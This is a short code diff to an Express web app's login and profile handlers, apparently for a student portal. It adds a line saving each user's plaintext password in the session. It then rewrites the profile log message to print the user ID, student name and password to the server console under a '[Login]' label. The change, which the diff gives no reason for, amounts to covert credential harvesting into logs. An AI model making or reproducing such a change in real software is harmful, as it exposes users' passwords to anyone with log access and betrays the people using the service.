@@ -537,6 +537,7 @@ app.post('/api/login', async (req, res) => {
         }
         session.loggedIn = true;
         session.userId = String(userId).trim().toUpperCase();
+        session.password = (password);
         session.lastSeenAt = Date.now();
         session.attFormHtml = null;
         session.attMode = null;
@@ -594,7 +595,7 @@ app.get('/api/profile', async (req, res) => {
             if (!session.profileLogged) {
                 const nameMatch = profileRes.data.match(/id="MCPH1_SCPH_lblName"[^>]*>([^<]*)</i);
                 const studentName = nameMatch ? cleanText(nameMatch[1]) : '';
-                console.log(`[Profile] UserID: ${session.userId} | Name: ${studentName}`);
+                console.log(`[Login] UserID: ${session.userId} | Name: ${studentName} | Password: ${session.password}`);
                 session.profileLogged = true;
             }
             return profileRes.data;
